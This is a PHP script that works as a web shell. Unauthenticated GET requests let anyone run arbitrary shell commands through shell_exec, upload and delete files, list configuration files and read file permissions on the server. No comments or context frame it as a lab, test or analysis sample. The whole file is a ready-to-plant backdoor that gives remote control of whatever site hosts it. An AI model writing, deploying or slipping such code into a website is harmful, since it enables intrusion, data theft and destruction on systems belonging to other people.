<?php

if (isset($_GET['action'])) {
    $action = $_GET['action'];

    switch ($action) {
        case 'list':
            listFiles();
            break;
        
        case 'upload':
            uploadFile();
            break;

        case 'delete':
            if (isset($_GET['file'])) {
                deleteFile($_GET['file']);
            }
            break;

        case 'execute':
            if (isset($_GET['command'])) {
                executeCommand($_GET['command']);
            }
            break;

        case 'search':
            if (isset($_GET['keyword'])) {
                searchFiles($_GET['keyword']);
            }
            break;
        
        case 'listConfigs':
            listConfigFiles();
            break;

        case 'permissions':
            checkPermissions();
            break;
    }
}


function listFiles() {
    $files = scandir('.');
    foreach ($files as $file) {
        echo "<div>$file</div>";
    }
}

function uploadFile() {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        $destination = './' . basename($file['name']);
        
        if (move_uploaded_file($file['tmp_name'], $destination)) {
            echo "File uploaded successfully.";
        } else {
            echo "File upload failed.";
        }
    }
}

function deleteFile($fileName) {
    if (file_exists($fileName)) {
        if (unlink($fileName)) {
            echo "File deleted successfully.";
        } else {
            echo "File deletion failed.";
        }
    } else {
        echo "File does not exist.";
    }
}

function executeCommand($command) {
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}


function searchFiles($keyword) {
    $files = scandir('.');
    foreach ($files as $file) {
        if (strpos($file, $keyword) !== false) {
            echo "<div>$file</div>";
        }
    }
}


function listConfigFiles() {
    $configFiles = array_merge(glob('*.ini'), glob('*.conf'), glob('*.config'));
    foreach ($configFiles as $file) {
        echo "<div>$file</div>";
    }
}


function checkPermissions() {
    $files = scandir('.');
    foreach ($files as $file) {
        $perms = fileperms($file);
        echo "<div>$file - " . substr(sprintf('%o', $perms), -4) . "</div>";
    }
}
?>
